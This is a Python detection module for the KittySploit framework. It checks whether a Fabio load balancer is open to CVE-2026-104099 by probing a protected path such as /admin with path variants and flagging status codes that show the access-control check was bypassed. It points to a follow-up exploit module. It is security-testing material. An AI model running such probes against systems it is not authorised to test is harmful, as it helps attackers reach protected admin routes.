#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-104099 — Fabio ACL bypass via unnormalized paths."""

from kittysploit import *
from lib.protocols.http.fabio import Fabio
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client, Fabio):
    __info__ = {
        "name": "Fabio CVE-2026-104099 ACL bypass detect",
        "description": "ACL matched on raw path; backend normalizes protected routes.",
        "author": ["LLCForge", "KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-104099"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-104099"],
        "tags": ["fabio", "acl", "bypass", "cve-2026-104099"],
        "agent": {
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/fabio_cve_2026_104099_acl_bypass"],
            },
        },
    }

    protected_path = OptString("/admin", "Path expected denied on direct access", required=False)

    def run(self):
        protected = str(self.protected_path or "/admin")
        denied, _ = self.fabio_probe_path(protected)
        if denied not in (401, 403, 404) and denied not in (0,):
            return False
        for path in self.fabio_bypass_paths(protected):
            code, _ = self.fabio_probe_path(path)
            if denied in (401, 403, 404) and code in (200, 301, 302):
                self.set_info(
                    severity="critical",
                    cve="CVE-2026-104099",
                    reason=f"ACL bypass {path}",
                    denied=denied,
                    bypass=code,
                )
                return True
        return False